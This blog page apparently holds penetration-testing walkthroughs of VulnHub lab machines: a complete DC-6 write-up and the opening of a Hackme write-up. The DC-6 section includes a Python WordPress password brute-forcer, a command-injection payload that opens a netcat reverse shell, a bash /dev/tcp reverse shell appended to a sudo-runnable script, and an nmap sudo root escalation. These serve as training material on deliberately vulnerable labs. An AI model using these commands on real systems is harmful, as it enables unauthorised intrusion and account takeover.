<!DOCTYPE html>
<html lang="en" class="html" data-theme="dark"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>
    
      Home
    
  </title>

  <!-- Begin Jekyll SEO tag v2.7.3 -->
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="Home" />
<meta name="author" content="s4rgaz" />
<meta property="og:locale" content="en_US" />
<link rel="canonical" href="http://localhost:4000/page3/" />
<meta property="og:url" content="http://localhost:4000/page3/" />
<meta property="og:site_name" content="Home" />
<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/page3/" />
<link rel="prev" href="http://localhost:4000/page2/" />
<link rel="next" href="http://localhost:4000/page4/" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/page3/" />
<meta property="twitter:title" content="Home" />
<script type="application/ld+json">
{"headline":"Home","url":"http://localhost:4000/page3/","author":{"@type":"Person","name":"s4rgaz"},"@type":"WebPage","@context":"https://schema.org"}</script>
<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
<!-- End Jekyll SEO tag -->
 
  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />

  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
  <link rel="stylesheet" href="/assets/css/main.css" />
  
    <script type="text/javascript">
  window.addEventListener('load', themeChange);
  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
  if (currentTheme)
    document.documentElement.setAttribute('data-theme', currentTheme);

  function themeChange() {
    let button = document.querySelector('.theme-toggle');

    button.addEventListener('click', function (e) {
      let currentTheme = document.documentElement.getAttribute('data-theme');
      if (currentTheme === 'dark') {
        transition();
        document.documentElement.setAttribute('data-theme', 'light');
        localStorage.setItem('theme', 'light');
      } else {
        transition();
        document.documentElement.setAttribute('data-theme', 'dark');
        localStorage.setItem('theme', 'dark');
      }
    });

    let transition = () => {
      document.documentElement.classList.add('transition');
      window.setTimeout(() => {
        document.documentElement.classList.remove('transition');
      }, 1000);
    }
  }
</script>


  

</head>
<body>
    <main class="page-content" aria-label="Content">
      <div class="w">
        <header>

<ul class="horizontal-list">
  
    <li>
      <a href="/">
        Home
      </a>
      &nbsp;&nbsp;
    </li>
  
    <li>
      <a href="/walkthroughs">
        Walkthroughs
      </a>
      &nbsp;&nbsp;
    </li>
  
    <li>
      <a href="/about">
        About
      </a>
      &nbsp;&nbsp;
    </li>
  
</ul>
 
<!--  <div class="dashed"></div> -->


<!--  <h1>Home</h1> -->
  
</header>

<!-- Content -->
<!--  
    <h1 class="post-title">VulnHub - DC 6</h1>
	<p class="post-date text-bold text-upcase">
	<span>January 2022</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>

<p><strong>Author:</strong> DCAU</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root and read the one and only flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>To discover the target host a ping scan was performed, the script you can download it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.187 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP port scan was done with nmap in order to detect open ports on the server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">--open</span> 192.168.179.187 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>With the aim to obtain more information on the open ports, an aggressive scan was performed, it enables service and OS detection, script scanning and traceroute.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p22</span>,80 192.168.179.187 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd <span class="o">(</span>RSA<span class="o">)</span>
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Did not follow redirect to http://wordy/
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>For the web page to be resolved correctly we must edit the <strong>/etc/hosts</strong> file on the attacking machine, as shown below.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"192.168.179.187 wordy"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</code></pre></div></div>

<p><img src="/assets/images/dc6/screenshot-1.png" alt="" /></p>

<p>The first scanning with wpscan discovered some wordpress users.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://wordy/ <span class="nt">--enumerate</span> vp,vt,u 
...
<span class="o">[</span>+] WordPress version 5.1.1 identified <span class="o">(</span>Insecure, released on 2019-03-13<span class="o">)</span><span class="nb">.</span>
 | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
 |  - http://wordy/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>5.1.1&lt;/generator&gt;
 |  - http://wordy/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>5.1.1&lt;/generator&gt;
 ...
 <span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:

<span class="o">[</span>+] admin
 | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
 | Confirmed By:
 |  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
 |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] graham
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] mark
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] sarah
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] jens
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 ...
</code></pre></div></div>

<p>I saved the users into a file to brute force later.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"admin</span><span class="se">\n</span><span class="s2">graham</span><span class="se">\n</span><span class="s2">jens</span><span class="se">\n</span><span class="s2">mark</span><span class="se">\n</span><span class="s2">sarah"</span> <span class="o">&gt;</span> users.txt 
</code></pre></div></div>

<p>A further scan with wpscan reveals the <strong>plainview-activity-monitor</strong> plugin.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://wordy/ <span class="nt">--plugins-detection</span> aggressive
...
<span class="o">[</span>+] plainview-activity-monitor
 | Location: http://wordy/wp-content/plugins/plainview-activity-monitor/
 | Last Updated: 2018-08-26T15:08:00.000Z
 | Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
 | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 20180826
 | <span class="o">[!]</span> Directory listing is enabled
 |
 | Found By: Known Locations <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: 200
 |
 | Version: 20161228 <span class="o">(</span>50% confidence<span class="o">)</span>
 | Found By: Readme - ChangeLog Section <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
...
</code></pre></div></div>

<p>A google search reveals that it is vulnerable to OS command injection, but to exploit this vulnerability we need to log in.</p>

<p>We use the hint in the description of the machine at the time of download it, which specifies that the password starts with <strong>k01</strong> in the rockyou.txt to brute force.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz | <span class="nb">grep</span> <span class="s1">'k01'</span> <span class="o">&gt;</span> passwords.txt
</code></pre></div></div>

<p>I developed the following python script to perform a dictionary attack against the wordpress login form.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">init</span><span class="p">,</span> <span class="n">Fore</span>

<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Wordpress brute forecer.'</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--url'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'URL'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Wordpress login url'</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-l'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'USER'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Wordpress user'</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-L'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'USERFILE'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Users file'</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-P'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'PASSFILE'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Password file'</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="n">url</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">url</span>
<span class="n">user</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">l</span>
<span class="n">users_file</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">L</span>
<span class="n">password_file</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">P</span>

<span class="n">init</span><span class="p">()</span>
<span class="n">green</span> <span class="o">=</span> <span class="n">Fore</span><span class="p">.</span><span class="n">GREEN</span>
<span class="n">yellow</span> <span class="o">=</span> <span class="n">Fore</span><span class="p">.</span><span class="n">YELLOW</span>
<span class="n">gray</span> <span class="o">=</span> <span class="n">Fore</span><span class="p">.</span><span class="n">LIGHTBLACK_EX</span>
<span class="n">reset</span> <span class="o">=</span> <span class="n">Fore</span><span class="p">.</span><span class="n">RESET</span>

<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">passwd</span><span class="p">):</span>
    <span class="n">data</span><span class="o">=</span><span class="p">{</span>
            <span class="s">'log'</span><span class="p">:</span><span class="n">user</span><span class="p">,</span>
            <span class="s">'pwd'</span><span class="p">:</span><span class="n">passwd</span><span class="p">,</span>
            <span class="s">'wp-submit'</span><span class="p">:</span><span class="s">'Log+In'</span>
            <span class="p">}</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
    <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nb">SystemExit</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>


<span class="n">wordlist</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">password_file</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">checkLogin</span><span class="p">():</span>
    <span class="k">for</span> <span class="n">passwd</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
        <span class="k">if</span> <span class="s">"ERROR"</span> <span class="ow">in</span> <span class="n">login</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="n">passwd</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">gray</span><span class="si">}</span><span class="s">Trying =&gt; </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">passwd</span><span class="si">}{</span><span class="n">reset</span><span class="p">:</span><span class="mi">20</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">green</span><span class="si">}</span><span class="s">Found =&gt; </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">passwd</span><span class="si">}{</span><span class="n">reset</span><span class="p">:</span><span class="mi">20</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="k">break</span>

<span class="k">if</span> <span class="n">users_file</span><span class="p">:</span>
    <span class="n">users</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">users_file</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
        <span class="n">checkLogin</span><span class="p">()</span>
<span class="k">elif</span> <span class="n">user</span><span class="p">:</span>
    <span class="n">checkLogin</span><span class="p">()</span>
</code></pre></div></div>

<p>We run the script as shown below.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 wpforce.py <span class="nt">--url</span> http://wordy/wp-login.php <span class="nt">-L</span> users.txt <span class="nt">-P</span> passwords.txt 
Found <span class="o">=&gt;</span> mark:helpdesk01
</code></pre></div></div>

<p>In the obtained result we find mark’s password, and log in.</p>

<p><img src="/assets/images/dc6/screenshot-2.png" alt="" /></p>

<p><img src="/assets/images/dc6/screenshot-3.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="command-injection">Command Injection</h3>

<p>The Plainview Activity Monitor plugin before 20180826 for WordPress is vulnerable to OS command injection via shell metacharacters in the ip parameter of a wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools request.</p>

<p>The POC (Proof of Concept) you can download it <a href="https://www.exploit-db.com/exploits/45274">here</a>.</p>

<p>Following the instructions, we need to inject the <strong>IP or integer</strong> field, start BurpSuite and check if the <strong>Intercept is on</strong> button is enabled, then we type an IP address and click on <strong>Convert</strong>.</p>

<p><img src="/assets/images/dc6/screenshot-4.png" alt="" /></p>

<p>The request was intercepted, then we set up a netcat listener on port 443 and typed the following netcat command as shown bellow.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.179.187 | nc 192.168.179.1 443 <span class="nt">-e</span> /bin/bash
</code></pre></div></div>

<p><img src="/assets/images/dc6/screenshot-5.png" alt="" /></p>

<p>We have obtained a shell with low privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443              
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.187] 38106
python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
www-data@dc-6:/var/www/html/wp-admin<span class="err">$</span>
</code></pre></div></div>

<p>Listing mark’s home directory, graham’s password was found in a note.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dc-6:/home/mark<span class="nv">$ </span><span class="nb">ls
ls
</span>stuff
www-data@dc-6:/home/mark<span class="nv">$ </span><span class="nb">cat </span>stuff/things-to-do.txt
<span class="nb">cat </span>stuff/things-to-do.txt
Things to <span class="k">do</span>:

- Restore full functionality <span class="k">for </span>the hyperdrive <span class="o">(</span>need to speak to Jens<span class="o">)</span>
- Buy present <span class="k">for </span>Sarah<span class="s1">'s farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah'</span>s replacement
www-data@dc-6:/home/mark<span class="err">$</span>
</code></pre></div></div>

<p>We switch to the user graham.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dc-6:/home/mark<span class="nv">$ </span>su - graham
su - graham
Password: GSo7isUM1D4

graham@dc-6:~<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>graham<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>graham<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>graham<span class="o">)</span>,1005<span class="o">(</span>devs<span class="o">)</span>
graham@dc-6:~<span class="err">$</span>
</code></pre></div></div>

<p>User graham has sudo permissions to execute the <strong>/home/jens/backups.sh</strong>  script as user <strong>jens</strong> with no password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>graham@dc-6:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>  
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>graham on dc-6:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User graham may run the following commands on dc-6:
    <span class="o">(</span>jens<span class="o">)</span> NOPASSWD: /home/jens/backups.sh
graham@dc-6:~<span class="err">$</span>
</code></pre></div></div>

<p>We see that the script has execution privileges for all users, since <strong>graham</strong> belongs to the (devs) group it was possible to read the bash sciript and even write it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>graham@dc-6:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home/jens/backups.sh
<span class="nb">ls</span> <span class="nt">-la</span> /home/jens/backups.sh
<span class="nt">-rwxrwxr-x</span> 1 jens devs 50 Apr 26  2019 /home/jens/backups.sh

graham@dc-6:~<span class="nv">$ </span><span class="nb">cat</span> /home/jens/backups.sh
<span class="nb">cat</span> /home/jens/backups.sh
<span class="c">#!/bin/bash</span>
<span class="nb">tar</span> <span class="nt">-czf</span> backups.tar.gz /var/www/html
graham@dc-6:~<span class="err">$</span>
</code></pre></div></div>

<p>We add the following bash reverse shell to <strong>/home/jens/backups.sh</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>graham@dc-6:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"</span> <span class="o">&gt;&gt;</span> /home/jens/backups.sh
</code></pre></div></div>

<p>We start a netcat listener on port 443 and execute the following command on the server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>graham@dc-6:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> jens /home/jens/backups.sh
</code></pre></div></div>

<p>We have obtained a shell as user <strong>jens</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.187] 38108
jens@dc-6:/home/graham<span class="err">$</span>
</code></pre></div></div>

<p>The jeans user has permissions to execute the nmap binary as root with no password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jens@dc-6:/home/graham<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>jens on dc-6:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User jens may run the following commands on dc-6:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/nmap
jens@dc-6:/home/graham<span class="err">$</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>

<p>An excellent guide to escalating privileges through this means you can found it in the <a href="https://gtfobins.github.io/gtfobins/nmap/#sudo">GTFOBINS</a> cheat sheet.</p>

<p>Breaking down the nmap command, we create the <strong>/tmp/shell</strong> file that contains the instruction to execute an interactive <strong>bash</strong>, then through the NSE (Nmap Scripting Engine) it execute the <strong>/tmp/shell</strong> script that invokes a root shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jens@dc-6:/home/graham<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'os.execute("/bin/bash -i")'</span> <span class="o">&gt;</span> /tmp/shell
<span class="nb">echo</span> <span class="s1">'os.execute("/bin/bash -i")'</span> <span class="o">&gt;</span> /tmp/shell
jens@dc-6:/home/graham<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">--script</span> /tmp/shell
<span class="nb">sudo </span>nmap <span class="nt">--script</span> /tmp/shell

Starting Nmap 7.40 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-10 06:53 AEST
NSE: Warning: Loading <span class="s1">'/tmp/shell'</span> <span class="nt">--</span> the recommended file extension is <span class="s1">'.nse'</span><span class="nb">.</span>
root@dc-6:/home/graham#
</code></pre></div></div>

<p>We go to the root directory and read the flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@dc-6:/home/graham# <span class="nb">cd</span> /root
<span class="nb">cd</span> /root
root@dc-6:~# <span class="nb">ls
ls
</span>theflag.txt
root@dc-6:~# <span class="nb">cat </span>theflag.txt
<span class="nb">cat </span>theflag.txt


Yb        dP 888888 88     88         8888b.   dP<span class="s2">"Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   </span><span class="sb">`</span><span class="s2">"' 
   YP  YP    888888 88ood8 88ood8     8888Y"</span>   YbodP  88  Y8 888888 <span class="o">(</span>8<span class="o">)</span> 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
<span class="nb">who </span>have provided feedback, and <span class="nb">who </span>have taken <span class="nb">time </span>to <span class="nb">complete </span>these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Hackme</h1>
	<p class="post-date text-bold text-upcase">
	<span>January 2022</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Is a beginner difficulty level box, the lab was created to mimic real life environment.</p>

<p><strong>Author:</strong> x4bx54</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/hackme-1,330/">https://www.vulnhub.com/entry/hackme-1,330/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>To discover the target machine a ping scan was done, the script can be downloaded <a href="https://github.com/s4rgaz/hdiscovery.git">here</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.186 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP/UDP port scan was performed with unicornscan against the target server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-p1-65535</span> 192.168.179.186 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-p1-65535</span> 192.168.179.186 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
TCP open                     ssh[   22]         from 192.168.179.186  ttl 64 
TCP open                    http[   80]         from 192.168.179.186  ttl 64 
UDP open                 unknown[35405]         from 192.168.179.186  ttl 64 
UDP open                 unknown[36824]         from 192.168.179.186  ttl 64 
UDP open                 unknown[39810]         from 192.168.179.186  ttl 64 
UDP open                 unknown[41259]         from 192.168.179.186  ttl 64 
UDP open                 unknown[43890]         from 192.168.179.186  ttl 64 
UDP open                 unknown[46917]         from 192.168.179.186  ttl 64 
UDP open                 unknown[50643]         from 192.168.179.186  ttl 64 
UDP open                 unknown[60466]         from 192.168.179.186  ttl 64
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>In order to get more information about open ports, service detection and script scanning was done with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p22</span>,80 192.168.179.186 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 6b:a8:24:d6:09:2f:c9:9a:8e:ab:bc:6e:7d:4e:b9:ad <span class="o">(</span>RSA<span class="o">)</span>
|   256 ab:e8:4f:53:38:06:2c:6a:f3:92:e3:97:4a:0e:3e:d1 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 32:76:90:b8:7d:fc:a4:32:63:10:cd:67:61:49:d6:c4 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.34 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.34 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>A login web page was found, but we don’t have credentials.</p>

<p><img src="/assets/images/hackme/screenshot-1.png" alt="" /></p>

<p>When running dirb to discover web resources, was found the <strong>/upload</strong> directory.</p>

